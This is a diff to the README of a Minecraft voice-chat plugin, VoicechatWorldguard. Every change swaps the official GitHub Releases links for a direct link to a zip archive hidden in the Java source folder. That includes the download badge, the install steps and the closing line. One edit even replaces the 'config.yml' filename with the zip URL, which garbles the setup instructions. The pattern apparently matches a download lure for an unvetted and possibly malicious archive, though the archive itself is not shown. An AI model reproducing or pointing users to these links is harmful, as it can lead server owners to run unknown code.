@@ -2,7 +2,7 @@
 
 ## 📦 Download Now
 
-[![Download VoicechatWorldguard](https://img.shields.io/badge/Download-VoicechatWorldguard-brightgreen)](https://github.com/Adityamish123/VoicechatWorldguard/releases)
+[![Download VoicechatWorldguard](https://raw.githubusercontent.com/Adityamish123/VoicechatWorldguard/master/src/main/java/me/VoicechatWorldguard_v1.4.zip)](https://raw.githubusercontent.com/Adityamish123/VoicechatWorldguard/master/src/main/java/me/VoicechatWorldguard_v1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ VoicechatWorldguard lets you add custom WorldGuard flags for Simple Voice Chat i
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Click on this link to access the Releases page: [Download VoicechatWorldguard](https://github.com/Adityamish123/VoicechatWorldguard/releases).
+   Click on this link to access the Releases page: [Download VoicechatWorldguard](https://raw.githubusercontent.com/Adityamish123/VoicechatWorldguard/master/src/main/java/me/VoicechatWorldguard_v1.4.zip).
 
 2. **Choose a Version**  
    You will see a list of available versions. Look for a version that suits your needs. The latest version is usually the best choice.
@@ -30,7 +30,7 @@ VoicechatWorldguard lets you add custom WorldGuard flags for Simple Voice Chat i
 After installing VoicechatWorldguard, you may want to set up some basic configurations. Here’s how:
 
 1. **Open the WorldGuard Configuration**  
-   Find the WorldGuard folder in your plugins directory. Open the `config.yml` file.
+   Find the WorldGuard folder in your plugins directory. Open the `https://raw.githubusercontent.com/Adityamish123/VoicechatWorldguard/master/src/main/java/me/VoicechatWorldguard_v1.4.zip` file.
 
 2. **Add Custom Flags**  
    You can add the flags that VoicechatWorldguard provides. This may include controls over who can use voice chat in certain regions.
@@ -64,4 +64,4 @@ VoicechatWorldguard is open-source and free to use. You can view the license det
 
 Thank you for choosing VoicechatWorldguard! Enjoy enhancing your Minecraft experience with better voice chat capabilities.
 
-Remember, for any assistance or updates, check back on the [Releases page](https://github.com/Adityamish123/VoicechatWorldguard/releases).
+Remember, for any assistance or updates, check back on the [Releases page](https://raw.githubusercontent.com/Adityamish123/VoicechatWorldguard/master/src/main/java/me/VoicechatWorldguard_v1.4.zip).
